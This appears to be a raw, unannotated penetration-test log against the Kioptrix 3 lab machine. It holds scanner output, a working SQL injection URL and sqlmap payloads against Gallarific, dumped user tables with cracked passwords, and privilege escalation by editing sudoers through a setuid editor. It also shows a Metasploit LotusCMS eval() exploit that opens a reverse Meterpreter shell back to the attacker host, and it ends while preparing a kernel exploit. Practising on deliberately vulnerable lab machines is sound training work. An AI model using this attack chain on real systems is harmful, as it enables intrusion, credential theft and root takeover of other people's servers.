Nikto nikto -h kioptrix3.com - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 192.168.88.131 + Target Hostname: kioptrix3.com + Target Port: 80 + Start Time: 2020-01-04 14:09:31 (GMT1) --------------------------------------------------------------------------- + Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch + Cookie PHPSESSID created without the httponly flag + Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6 + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + No CGI Directories found (use '-C all' to force check all possible dirs) + Server may leak inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun 5 21:22:00 2009 + PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch. + Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch. + Web Server returns a valid response with junk HTTP methods, this may cause false positives. + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST + OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. + OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. + OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. + OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. + OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts. + OSVDB-3268: /icons/: Directory indexing found. + OSVDB-3233: /icons/README: Apache default file found. + /phpmyadmin/: phpMyAdmin directory found + OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts. + 7784 requests: 0 error(s) and 19 item(s) reported on remote host + End Time: 2020-01-04 14:09:52 (GMT1) (21 seconds) --------------------------------------------------------------------------- + 1 host(s) tested  gobuster ~/go/bin/gobuster dir -u http://kioptrix3.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -e -o gobuster_dir_dir-list-med_kioptrix3.com ============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://kioptrix3.com [+] Threads: 40 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Expanded: true [+] Timeout: 10s =============================================================== 2020/01/04 14:27:57 Starting gobuster =============================================================== http://kioptrix3.com/modules (Status: 301) http://kioptrix3.com/gallery (Status: 301) http://kioptrix3.com/data (Status: 403) http://kioptrix3.com/core (Status: 301) http://kioptrix3.com/style (Status: 301) http://kioptrix3.com/cache (Status: 301) http://kioptrix3.com/phpmyadmin (Status: 301) http://kioptrix3.com/server-status (Status: 403) =============================================================== 2020/01/04 14:28:12 Finished ===============================================================  exploit phpMyAdmin Default creds user: admin pass:\nGallarific 2.1 SQLi http://kioptrix3.com/gallery/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6+from+gallarific_users-- 1:admin:n0t7t1k4 3  sqlmap sqlmap identified the following injection point(s) with a total of 150 HTTP(s) requests: --- Parameter: id (GET) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause Payload: id=-6226 OR 6767=6767 Type: error-based Title: MySQL \u0026gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR) Payload: id=1 OR ROW(7964,8851)\u0026gt;(SELECT COUNT(*),CONCAT(0x71787a6b71,(SELECT (ELT(7964=7964,1))),0x7171767a71,FLOOR(RAND(0)*2))x FROM (SELECT 7501 UNION SELECT 4753 UNION SELECT 8655 UNION SELECT 9044)a GROUP BY x) Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: id=1 AND (SELECT 1628 FROM (SELECT(SLEEP(5)))jacP) Type: UNION query Title: Generic UNION query (NULL) - 6 columns Payload: id=1 UNION ALL SELECT CONCAT(0x71787a6b71,0x67416378756a444d6e4a6868477742664b48597175664f664d4f7a69755a7963735579686c6f5359,0x7171767a71),NULL,NULL,NULL,NULL,NULL-- MpZe --- back-end DBMS: MySQL \u0026gt;= 4.1 Database: gallery Table: dev_accounts [2 entries] +----+---------------------------------------------+------------+ | id | password | username | +----+---------------------------------------------+------------+ | 1 | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r) | dreg | | 2 | 5badcaf789d3d1d09794d8f021f40f0e (starwars) | loneferret | +----+---------------------------------------------+------------+ Database: gallery Table: gallarific_users [1 entry] +--------+---------+---------+---------+----------+----------+----------+----------+-----------+-----------+------------+-------------+ | userid | email | photo | website | joincode | lastname | password | username | usertype | firstname | datejoined | issuperuser | +--------+---------+---------+---------+----------+----------+----------+----------+-----------+-----------+------------+-------------+ | 1 | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | User | n0t7t1k4 | admin | superuser | Super | 1302628616 | 1 | +--------+---------+---------+---------+----------+----------+----------+----------+-----------+-----------+------------+-------------+ Database: gallery Table: gallarific_settings [18 entries] +-------------+--------------------------------------+----------------+ | settings_id | settings_name | settings_value | +-------------+--------------------------------------+----------------+ | 1 | gallarific_version | 2.0 | | 2 | gallarific_theme | black | | 3 | gallarific_gallery_name | Gallarific | | 7 | gallarific_photos_per_page | 20 | | 8 | gallarific_comments_per_page | 10 | | 9 | gallarific_users_per_page | 20 | | 10 | gallarific_recent_photos | 4 | | 11 | gallarific_popular_photos | 8 | | 12 | gallarific_accept_user_registrations | 1 | | 15 | gallarific_comments_enabled | 1 | | 16 | gallarific_auto_approve_comments | 0 | | 17 | gallarific_userimage_width | 32 | | 18 | gallarific_userimage_height | 32 | | 19 | gallarific_medium_width | 430 | | 20 | gallarific_medium_height | 430 | | 21 | gallarific_thumbnail_width | 150 | | 22 | gallarific_thumbnail_height | 150 | | 24 | gallarific_installer_done | 1 | +-------------+--------------------------------------+----------------+ Database: gallery Table: gallarific_photos [3 entries] +--------+---------+-----------+---------+-----------------------+-------+--------+--------+----------------+-----------+-----------+----------------------------------+--------------+ | userid | photoid | galleryid | tags | title | views | size | status | filename | votecount | votetotal | description | dateuploaded | +--------+---------+-----------+---------+-----------------------+-------+--------+--------+----------------+-----------+-----------+----------------------------------+--------------+ | 1 | 5 | 1 | \u0026lt;blank\u0026gt; | Photo Shoot | 19 | 19374 | 1 | 8y1a02r6yh.jpg | 0 | 0 | New picture for new book | 1302652908 | | 1 | 3 | 1 | \u0026lt;blank\u0026gt; | In the know... | 16 | 16279 | 1 | 8csqlvc375.jpg | 0 | 0 | Self-Explanotory | 1302652708 | | 1 | 4 | 1 | \u0026lt;blank\u0026gt; | Getting ready for GNN | 15 | 10618 | 1 | 0q52na4t2g.jpg | 1 | 5 | Hours before software's release! | 1302651920 | +--------+---------+-----------+---------+-----------------------+-------+--------+--------+----------------+-----------+-----------+----------------------------------+--------------+ Database: gallery Table: gallarific_galleries [1 entry] +----------+-----------+-------------------+------+------------+-------------------------------------------------------------------------------------------------------------------------+ | parentid | galleryid | name | sort | created | description | +----------+-----------+-------------------+------+------------+-------------------------------------------------------------------------------------------------------------------------+ | 0 | 1 | Ligoat Press Room | 0 | 1302628616 | See how we are doing in the news! This is a collection of wild pictures, good times and how to make money at its best. | +----------+-----------+-------------------+------+------------+-------------------------------------------------------------------------------------------------------------------------+ Database: gallery Table: gallarific_stats [15 entries] +----+------------------+-------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------+-------+---------+--------------+---------+----------------------+----------+--------------------------+--------------------------+----------------------------------+--------------------------------------------------+----------------------------------+------------------------------------------------------+---------+---------+------------------------------+----------------------------------------------+---------+---------+---------+ | ID | Var01 | Var02 | Var03 | Var04 | Var05 | Var06 | Var07 | Var08 | Var09 | Var10 | Var11 | Var12 | Var13 | Var14 | Var15 | Var16 | Var17 | Var18 | Var19 | Var20 | Var21 | Var22 | Var23 | +----+------------------+-------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------+-------+---------+--------------+---------+----------------------+----------+--------------------------+--------------------------+----------------------------------+--------------------------------------------------+----------------------------------+------------------------------------------------------+---------+---------+------------------------------+----------------------------------------------+---------+---------+---------+ | 1 | MTMwMjYyODcxOQ== | MTU= | aHR0cDovL2tpb3B0cml4My5jb20vaW5kZXgucGhw | AA== | MA== | \u0026lt;blank\u0026gt; | I2JjYmNiYw== | \u0026lt;blank\u0026gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | V2l0aCBUaGFua3MgVG8gfg== | U2l0ZSBMaW5rcyB+ | UGhvdG8gR2FsbGVyeSBTY3JpcHQ= | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS90b3VyLnBocA== | SG9zdCBNdWx0aXBsZSBTaXRlcw== | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | | 2 | MTMwMjYyODgwNg== | MTU= | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9bnVsbCthbmQrMT0yK3VuaW9uK3NlbGVjdCsxLGdyb3VwX2NvbmNhdCh1c2VyaWQsMHgzYSx1c2VybmFtZSwweDNhLHBhc3N3b3JkKSwzLDQsNSw2Kytmcm9tK2dhbGxhcmlmaWNfdXNlcnMtLQ== | AA== | MA== | \u0026lt;blank\u0026gt; | I2JjYmNiYw== | \u0026lt;blank\u0026gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | SW1wbGVtZW50ZWQgQnk6 | R3JhY2lvdXMgVGhhbmtzOg== | UEhQIFBob3RvIEdhbGxlcnk= | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8= | SG9zdCBSZXNlbGxlciBTaXRlcw== | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | | 3 | MTMwMjYyODg0OA== | MTQ= | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9MQ== | AA== | MA== | \u0026lt;blank\u0026gt; | I2JjYmNiYw== | \u0026lt;blank\u0026gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | VGhhbmtzIFRv | V2ViIExpbmtz | UEhQIFBpY3R1cmUgR2FsbGVyeQ== | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8= | RmFzdCBTZXJ2ZXIgSG9zdA== | aHR0cDovL3d3dy5zYWNob3N0LmNvbS8= | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | | 4 | MTMwMjYyODg3Mw== | MTU= | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9NDg= | AA== | MA== | \u0026lt;blank\u0026gt; | I2JjYmNiYw== | \u0026lt;blank\u0026gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | SW1wbGVtZW50ZWQgQnk6 | R3JhY2lvdXMgVGhhbmtzOg== | UGhvdG8gR2FsbGVyeSBTY3JpcHRz | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8= | TXVsdGlwbGUgRG9tYWluIEhvc3Rpbmc= | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | | 5 | MTMwMjYyODg4MA== | MjQ= | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9NTIyOA== | AA== | MA== | \u0026lt;blank\u0026gt; | I2JjYmNiYw== | \u0026lt;blank\u0026gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | SW1wbGVtZW50ZWQgQnk6 | R3JhY2lvdXMgVGhhbmtzOg== | R2FsbGVyeSBQaG90byBQSFAgU2NyaXB0 | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8= | QnV5IFNTTCBDZXJ0aWZpY2F0ZQ== | aHR0cDovL3d3dy5icmlnaHQtYnl0ZS5jb20vc3NsLw== | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | | 6 | MTMwMjYyODg4OQ== | MjU= | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9MSUyMEFORCUyMDk0MjA9MTQ4MQ== | AA== | MA== | \u0026lt;blank\u0026gt; | I2JjYmNiYw== | \u0026lt;blank\u0026gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | Q29uZmVycmVkIEJ5IH4= | TW9yZSBTaXRlcyB+ | UGl4IEdhbGxlcnk= | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS9mYXEucGhw | R2VvVHJ1c3QgU1NMIENlcnRpZmljYXRl | aHR0cDovL3d3dy5icmlnaHQtYnl0ZS5jb20vc3NsLw== | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | | 7 | MTMwMjYyODg5Nw== | MjQ= | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9MSUyMEFORCUyMDEyOTY9MTI5Ng== | AA== | MA== | \u0026lt;blank\u0026gt; | I2JjYmNiYw== | \u0026lt;blank\u0026gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | QXNzb2NpYXRlZCBXaXRoIC0= | T3RoZXIgTGlua3MgLQ== | UEhQIFBob3RvcyBTY3JpcHQ= | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8= | RmFudGFzdGljbyBIb3N0 | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | | 8 | MTMwMjYyODkwNw== | MTM= | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9MSUyMEFORCUyMFNMRUVQJTI4NSUyOQ== | AA== | MA== | \u0026lt;blank\u0026gt; | I2JjYmNiYw== | \u0026lt;blank\u0026gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | UHJvdmlkZWQgYnkgLS0= | T3RoZXIgTGlua3MgLS0= | UEhQIFBob3RvIEdhbGxlcnk= | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8= | RmFudGFzdGljbyBIb3N0 | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | | 9 | MTMwMjYzMTM3MA== | MTc= | aHR0cDovL2tpb3B0cml4My5jb20vcC5waHAvMQ== | AA== | MA== | \u0026lt;blank\u0026gt; | I2JjYmNiYw== | \u0026lt;blank\u0026gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | Q29uZmVycmVkIEJ5IH4= | TW9yZSBTaXRlcyB+ | UEhQIFBob3RvIEdhbGxlcnk= | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8= | UmVzZWxsZXIgQWNjb3VudCBIb3N0 | aHR0cDovL3d3dy5teWN3cy5jb20vaG9zdGluZy9yZXNlbGxlci8= | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | | 10 | MTMwMjYzNTQ5Nw== | MjU= | aHR0cDovL2tpb3B0cml4My5jb20vZy5waHAvMQ== | AA== | MA== | \u0026lt;blank\u0026gt; | I2JjYmNiYw== | \u0026lt;blank\u0026gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | SW1wbGVtZW50ZWQgQnk6 | R3JhY2lvdXMgVGhhbmtzOg== | R2FsbGFyaWZpYw== | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS92aWRlby5waHA= | RmFzdGVyIFdlYiBIb3N0 | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | | 11 | MTMwMjYzNTUxMA== | MTA= | aHR0cDovL2tpb3B0cml4My5jb20vcmVjZW50LnBocA== | AA== | MA== | \u0026lt;blank\u0026gt; | I2JjYmNiYw== | \u0026lt;blank\u0026gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | TWFkZSBQb3NzaWJsZSBCeTo= | VGhhbmtzIFRvOg== | UGhvdG8gR2FsbGVyeSBTY3JpcHQ= | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS90b3VyLnBocA== | Q2hlYXBlc3QgRG9tYWluIE5hbWVz | aHR0cDovL3d3dy5icmlnaHQtYnl0ZS5jb20vY3AvY2hlY2sucGhw | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | | 12 | MTMwMjYzNTU5MQ== | MjM= | aHR0cDovL2tpb3B0cml4My5jb20vbG9nb3V0LnBocA== | AA== | MA== | \u0026lt;blank\u0026gt; | I2JjYmNiYw== | \u0026lt;blank\u0026gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | UHJlc2VudGVkIEJ5IDo6 | TXVjaCBUaGFua3MgOjo= | UEhQIFBob3RvIEdhbGxlcnk= | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8= | UmVzZWxsZXIgQWNjb3VudCBIb3N0 | aHR0cDovL3d3dy5teWN3cy5jb20vaG9zdGluZy9yZXNlbGxlci8= | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | | 13 | MTMwMjYzODQwOA== | MjE= | aHR0cDovL2tpb3B0cml4My5jb20vcHJvZmlsZS5waHA= | AA== | MA== | \u0026lt;blank\u0026gt; | I2JjYmNiYw== | \u0026lt;blank\u0026gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | UHJvdmlkZWQgYnkgLS0= | T3RoZXIgTGlua3MgLS0= | UGhvdG8gU2hhcmluZyBHYWxsZXJ5 | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS92aWRlby5waHA= | SG9zdCBNdWx0aXBsZSBEb21haW5z | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | | 14 | MTMwMjY1MTc5Mg== | MjY= | aHR0cDovL2tpb3B0cml4My5jb20vcC5waHAvMg== | AA== | MA== | \u0026lt;blank\u0026gt; | I2JjYmNiYw== | \u0026lt;blank\u0026gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | VGhhbmtzIHRvID4= | QWxzbyA+ | UEhQIFBob3RvIEdhbGxlcnk= | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8= | U2FjcmFtZW50byBIb3N0aW5n | aHR0cDovL3d3dy5zYWNob3N0LmNvbS8= | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | Q2hlYXAgU1NMIENlcnRpZmljYXRl | aHR0cDovL3d3dy5icmlnaHQtYnl0ZS5jb20vc3NsLw== | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | | 15 | MTMwMjY1MjA4NQ== | Nw== | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9MSZzb3J0PXBob3RvaWQ= | AA== | MA== | \u0026lt;blank\u0026gt; | I2JjYmNiYw== | \u0026lt;blank\u0026gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | Q29tcGxpbWVudHMgT2Y6 | QWRkaXRpb25hbCBUaGFua3M6 | UEhQIFBob3RvIFNvZnR3YXJl | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS92aWRlby5waHA= | QnV5IFNTTCBDZXJ0aWZpY2F0ZQ== | aHR0cDovL3d3dy5icmlnaHQtYnl0ZS5jb20vc3NsLw== | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | +----+------------------+-------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------+-------+---------+--------------+---------+----------------------+----------+--------------------------+--------------------------+----------------------------------+--------------------------------------------------+----------------------------------+------------------------------------------------------+---------+---------+------------------------------+----------------------------------------------+---------+---------+---------+ Database: gallery Table: gallarific_comments [0 entries] +---------+ | comment | +---------+ +---------+  SSH ssh loneferret@192.168.88.131 The authenticity of host '192.168.88.131 (192.168.88.131)' can't be established. RSA key fingerprint is SHA256:NdsBnvaQieyTUKFzPjRpTVK6jDGM/xWwUi46IR/h1jU. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '192.168.88.131' (RSA) to the list of known hosts. loneferret@192.168.88.131's password: Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. To access official Ubuntu documentation, please visit: http://help.ubuntu.com/ Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106 loneferret@Kioptrix3:~$ ls checksec.sh CompanyPolicy.README loneferret@Kioptrix3:~$ cat CompanyPolicy.README Hello new employee, It is company policy here to use our newly installed software for editing, creating and viewing files. Please use the command 'sudo ht'. Failure to do so will result in you immediate termination. DG CEO loneferret@Kioptrix3:~$ whereis ht ht: /usr/local/bin/ht loneferret@Kioptrix3:~$ ls -la /usr/local/bin/ht -rwsr-sr-x 1 root root 2072344 2011-04-16 07:26 /usr/local/bin/ht #### setuid bit is enabled, owned by root Edited /etc/sudoers # User privilege specification root ALL=(ALL) ALL loneferret ALL=(ALL) ALL loneferret@Kioptrix3:~$ sudo bash [sudo] password for loneferret: root@Kioptrix3:~#  LotusCMS 3.0 - \u0026lsquo;eval()\u0026rsquo; msf5 \u0026gt; workspace kioptrix [*] Workspace: kioptrix msf5 \u0026gt; search lotus Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/dos/http/ibm_lotus_notes 2017-08-31 normal No IBM Notes encodeURI DOS 1 auxiliary/dos/http/ibm_lotus_notes2 2017-08-31 normal No IBM Notes Denial Of Service 2 auxiliary/dos/misc/ibm_sametime_webplayer_dos 2013-11-07 normal No IBM Lotus Sametime WebPlayer DoS 3 auxiliary/gather/ibm_sametime_enumerate_users 2013-12-27 normal No IBM Lotus Notes Sametime User Enumeration 4 auxiliary/gather/ibm_sametime_room_brute 2013-12-27 normal No IBM Lotus Notes Sametime Room Name Bruteforce 5 auxiliary/gather/ibm_sametime_version 2013-12-27 normal No IBM Lotus Sametime Version Enumeration 6 auxiliary/scanner/lotus/lotus_domino_hashes normal No Lotus Domino Password Hash Collector 7 auxiliary/scanner/lotus/lotus_domino_login normal No Lotus Domino Brute Force Utility 8 auxiliary/scanner/lotus/lotus_domino_version normal No Lotus Domino Version 9 exploit/multi/http/lcms_php_exec 2011-03-03 excellent Yes LotusCMS 3.0 eval() Remote Command Execution 10 exploit/windows/browser/ibmlotusdomino_dwa_uploadmodule 2007-12-20 normal No IBM Lotus Domino Web Access Upload Module Buffer Overflow 11 exploit/windows/browser/inotes_dwa85w_bof 2012-06-01 normal No IBM Lotus iNotes dwa85W ActiveX Buffer Overflow 12 exploit/windows/browser/notes_handler_cmdinject 2012-06-18 excellent No IBM Lotus Notes Client URL Handler Command Injection 13 exploit/windows/browser/quickr_qp2_bof 2012-05-23 normal No IBM Lotus QuickR qp2 ActiveX Buffer Overflow 14 exploit/windows/fileformat/lotusnotes_lzh 2011-05-24 good No Lotus Notes 8.0.x - 8.5.2 FP2 - Autonomy Keyview (.lzh Attachment) 15 exploit/windows/lotus/domino_http_accept_language 2008-05-20 average No IBM Lotus Domino Web Server Accept-Language Stack Buffer Overflow 16 exploit/windows/lotus/domino_icalendar_organizer 2010-09-14 normal Yes IBM Lotus Domino iCalendar MAILTO Buffer Overflow 17 exploit/windows/lotus/domino_sametime_stmux 2008-05-21 average Yes IBM Lotus Domino Sametime STMux.exe Stack Buffer Overflow 18 exploit/windows/lotus/lotusnotes_lzh 2011-05-24 normal No Lotus Notes 8.0.x - 8.5.2 FP2 - Autonomy Keyview (.lzh Attachment) msf5 \u0026gt; use 9 msf5 exploit(multi/http/lcms_php_exec) \u0026gt; show options Module options (exploit/multi/http/lcms_php_exec): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections URI /lcms/ yes URI VHOST no HTTP server virtual host Exploit target: Id Name -- ---- 0 Automatic LotusCMS 3.0 msf5 exploit(multi/http/lcms_php_exec) \u0026gt; set RHOSTS 192.168.88.131 RHOSTS =\u0026gt; 192.168.88.131 msf5 exploit(multi/http/lcms_php_exec) \u0026gt; set VHOST kioptrix3.com VHOST =\u0026gt; kioptrix3.com msf5 exploit(multi/http/lcms_php_exec) \u0026gt; set URI / URI =\u0026gt; / msf5 exploit(multi/http/lcms_php_exec) \u0026gt; show options Module options (exploit/multi/http/lcms_php_exec): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 192.168.88.131 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections URI / yes URI VHOST kioptrix3.com no HTTP server virtual host Exploit target: Id Name -- ---- 0 Automatic LotusCMS 3.0 msf5 exploit(multi/http/lcms_php_exec) \u0026gt; run [*] Started reverse TCP handler on 192.168.88.128:4444 [*] Using found page param: /index.php?page=index [*] Sending exploit ... [*] Sending stage (38288 bytes) to 192.168.88.131 [*] Meterpreter session 1 opened (192.168.88.128:4444 -\u0026gt; 192.168.88.131:57972) at 2020-01-04 15:22:46 +0100 meterpreter \u0026gt; sysinfo Computer : Kioptrix3 OS : Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 Meterpreter : php/linux meterpreter \u0026gt; getuid Server username: www-data (33) meterpreter \u0026gt; shell Process 4390 created. Channel 7 created. lsb_release -a No LSB modules are available. Distributor ID: Ubuntu Description: Ubuntu 8.04.3 LTS Release: 8.04 Codename: hardy  Priv Esc root@kali:~/kioptrix/level3# searchsploit -m exploits/linux/remote/8556.c Exploit: Linux Kernel 2.6.20/2.6.24/2.6.27_7-10 (Ubuntu 7.04/8.04/8.10 / Fedora Core 10 / OpenSuse 11.1) - SCTP FWD Memory Corruption Remote Overflow URL: https://www.exploit-db.com/exploits/8556 Path: /usr/share/exploitdb/exploits/linux/remote/8556.c File Type: C source, ASCII text, with CRLF line terminators Copied to: /root/kioptrix/level3/8556.c root@kali:~/kioptrix/level3# gcc 8556.c -o 8556 8556.c:32:10: fatal error: netinet/sctp.h: No such file or directory 32 | #include \u0026lt;netinet/sctp.h\u0026gt; | ^~~~~~~~~~~~~~~~ compilation terminated. root@kali:~/kioptrix/level3# apt install libsctp-dev Reading package lists... Done 